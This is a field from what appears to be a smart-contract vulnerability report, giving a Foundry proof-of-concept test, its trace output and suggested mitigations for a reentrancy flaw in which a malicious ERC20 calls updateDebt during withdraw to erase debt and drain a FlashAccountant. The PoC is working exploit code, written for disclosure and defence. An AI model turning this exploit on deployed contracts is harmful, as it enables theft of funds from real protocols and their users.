      "proofOfConcept": "##  **Proof of Concept (working test)**\n\n**HIGH severity**:\n\n- Attacker can drain any amount of the malicious ERC20 that the accountant holds.\n- No repayment required.\n- No revert is triggered.\n- The system remains unaware that accounting was bypassed.\n\nExtensions relying on FlashAccountant are also affected.\n\nAdd the following PoC test in test/base/FlashAccountantDebtReentrancy.t.sol\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.30;\n\nimport \"forge-std/Test.sol\";\n\nimport {IFlashAccountant} from \"../../src/interfaces/IFlashAccountant.sol\";\nimport {FlashAccountant} from \"../../src/base/FlashAccountant.sol\";\nimport {FlashAccountantLib} from \"../../src/libraries/FlashAccountantLib.sol\";\n\n/// @dev Concrete accountant for tests – uses the real FlashAccountant logic.\ncontract TestAccountant is FlashAccountant {}\n\n/// @dev Minimal malicious ERC20 that re-enters the accountant on transfer().\ncontract MaliciousToken {\n    string public name = \"MaliciousToken\";\n    string public symbol = \"MAL\";\n    uint8 public decimals = 18;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    IFlashAccountant public immutable accountant;\n    bool public reenterOnTransfer;\n    uint256 public lastTransferAmount;\n\n    constructor(IFlashAccountant _accountant) {\n        accountant = _accountant;\n    }\n\n    function setReenter(bool value) external {\n        reenterOnTransfer = value;\n    }\n\n    function mint(address to, uint256 amount) external {\n        balanceOf[to] += amount;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        uint256 allowed = allowance[from][msg.sender];\n        require(allowed >= amount, \"allowance\");\n        allowance[from][msg.sender] = allowed - amount;\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        require(balanceOf[from] >= amount, \"balance\");\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n\n        lastTransferAmount = amount;\n\n        // Re-enter accountant during withdraw transfer:\n        // when the accountant is sending tokens out to the recipient.\n        if (reenterOnTransfer && from == address(accountant)) {\n            // one-shot to avoid infinite recursion\n            reenterOnTransfer = false;\n\n            // delta = -int128(amount)\n            int128 delta = -int128(int256(amount));\n\n            // encode selector + int128 delta as 20 bytes:\n            // 4 bytes selector || 16 bytes int128\n            bytes memory data = abi.encodePacked(\n                IFlashAccountant.updateDebt.selector,\n                delta\n            );\n\n            (bool ok, ) = address(accountant).call(data);\n            require(ok, \"updateDebt reenter failed\");\n        }\n    }\n}\n\n/// @dev Locker/attacker that opens a lock and calls withdraw() inside the lock context.\ncontract ReentrantLocker {\n    IFlashAccountant public immutable accountant;\n    MaliciousToken public immutable token;\n    address public attacker;\n\n    uint128 public constant AMOUNT = 1 ether;\n\n    constructor(IFlashAccountant _accountant, MaliciousToken _token) {\n        accountant = _accountant;\n        token = _token;\n    }\n\n    /// @dev Entry point for the off-chain test.\n    function executeExploit() external {\n        attacker = msg.sender;\n        token.setReenter(true);\n\n        // This will cause FlashAccountant.lock() to callback into locked_6416899205(id)\n        accountant.lock();\n    }\n\n    /// @dev Callback used by FlashAccountant.lock().\n    /// The selector for this function is fixed by the interface (locked_6416899205).\n    function locked_6416899205(uint256 /*id*/) external {\n        require(msg.sender == address(accountant), \"only accountant\");\n\n        // Use the official helper to encode and call withdraw on the accountant.\n        FlashAccountantLib.withdraw(\n            accountant,          // already IFlashAccountant\n            address(token),\n            attacker,\n            AMOUNT\n        );\n    }\n}\n\n/// @dev Foundry test: tries to exploit withdraw + updateDebt reentrancy.\ncontract FlashAccountantDebtReentrancyTest is Test {\n    TestAccountant public accountant;\n    MaliciousToken public mal;\n    ReentrantLocker public locker;\n\n    address public attacker = address(0xBEEF);\n\n    uint256 public constant INITIAL_BALANCE = 10 ether;\n    uint128 public constant AMOUNT = 1 ether;\n\n    function setUp() public {\n        accountant = new TestAccountant();\n        // TestAccountant already implements IFlashAccountant\n        mal = new MaliciousToken(accountant);\n\n        // Accountant starts holding some malicious tokens\n        mal.mint(address(accountant), INITIAL_BALANCE);\n\n        locker = new ReentrantLocker(accountant, mal);\n    }\n\n    /// @notice PoC: malicious token re-enters during withdraw and calls updateDebt\n    ///         to erase its own debt within the same lock.\n    function test_maliciousToken_canEraseDebt_via_updateDebt_reentrancy() public {\n        uint256 accountantBalanceBefore = mal.balanceOf(address(accountant));\n        uint256 attackerBalanceBefore = mal.balanceOf(attacker);\n\n        // Attacker triggers the exploit via the locker\n        vm.prank(attacker);\n        locker.executeExploit();\n\n        uint256 accountantBalanceAfter = mal.balanceOf(address(accountant));\n        uint256 attackerBalanceAfter = mal.balanceOf(attacker);\n\n        // The attacker should receive tokens...\n        assertEq(\n            attackerBalanceAfter,\n            attackerBalanceBefore + AMOUNT,\n            \"attacker did not receive withdrawn tokens\"\n        );\n\n        // ...and the accountant should have lost them.\n        assertEq(\n            accountantBalanceAfter,\n            accountantBalanceBefore - AMOUNT,\n            \"accountant balance did not decrease as expected\"\n        );\n\n        // From the accountant's perspective, the lock completed successfully:\n        // there was no revert due to DebtsNotZeroed.\n        // If this test passes, it demonstrates that debt was effectively erased\n        // inside the same lock via updateDebt reentrancy.\n    }\n}\n```\n\n## **Execution**\n```solidity\nforge test --match-path test/base/FlashAccountantDebtReentrancy.t.sol -vvvv\n```\n## **Expected output (excerpt)**\n```solidity\nRan 1 test for test/base/FlashAccountantDebtReentrancy.t.sol:FlashAccountantDebtReentrancyTest\n[PASS] test_maliciousToken_canEraseDebt_via_updateDebt_reentrancy() (gas: 105072)\nTraces:\n...\n    ├─ [503] MaliciousToken::balanceOf(TestAccountant: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]\n    │   └─ ← [Return] 9000000000000000000 [9e18]\n    ├─ [503] MaliciousToken::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]\n    │   └─ ← [Return] 1000000000000000000 [1e18]\n    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], \"attacker did not receive withdrawn tokens\") [staticcall]\n    │   └─ ← [Return]\n    ├─ [0] VM::assertEq(9000000000000000000 [9e18], 9000000000000000000 [9e18], \"accountant balance did not decrease as expected\") [staticcall]\n    │   └─ ← [Return]\n    └─ ← [Return]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 871.80µs (238.50µs CPU time)\n\nRan 1 test suite in 18.46ms (871.80µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n```\nMaliciousToken.transfer → reenter → updateDebt(-amount)\nLock closes normally\nAttacker receives 1e18 MAL\nAccountant balance decreases by 1e18 MAL\n[PASS]\n```\nThis proves **free withdrawal with debt erased**.\n\n##  **Suggested Mitigations**\n\n### **Option A — Restrict `updateDebt` callers**\n```solidity\nrequire(msg.sender == currentLockerAddress, \"unauthorized\");\n```\n\n### **Option B — Block negative deltas inside lock**\nOnly allow reductions during settlement phases.\n\n### **Option C — Forbid debt mutations during external token transfers**\nNo accountant state change should occur during outbound transfers.",
